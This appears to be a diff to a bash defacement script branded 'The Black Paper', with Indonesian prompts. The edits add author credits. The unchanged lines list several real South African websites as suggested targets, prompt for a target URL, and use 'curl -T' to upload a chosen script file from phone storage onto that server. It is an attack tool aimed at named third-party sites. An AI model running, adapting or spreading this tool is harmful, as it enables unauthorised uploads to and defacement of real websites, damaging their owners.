@@ -1,4 +1,5 @@
-fz#Gilacoding
+#blackpaper
+#by 7870a
 green="\033[32;1m"
 yellow="\033[33;1m"
 indigo="\033[34;1m"
@@ -43,7 +44,15 @@ echo "loading.............";
 sleep 0.1;
 clear
 figlet -f future "The Black Paper"
-read -p " nama samaran=> " name
+echo $green
+echo --------------------------------
+echo made by :7870a
+echo group   :The Black Paper
+echo youtube :78 komputer
+echo github  :https://github.com/7870a
+echo ---------------------------------
+echo $yellow
+read -p "nama samaran=> " name
 clear
 echo
 echo
@@ -61,7 +70,7 @@ echo http://windmillsandporcupines.co.za
 echo http://tcnig.co.za
 echo http://contsol.co.za recomended
 echo $yellow
-read -p " target=> " target
+read -p "target=> " target
 clear
 echo
 echo
@@ -69,7 +78,7 @@ echo $red
 echo simpan script di memory
 echo internal diluar folder
 echo $green
-read -p " masukan nama script=> " sc
+read -p "masukan nama script=> " sc
 curl -T /storage/emulated/0/$sc $target
 echo
 echo  $yellow
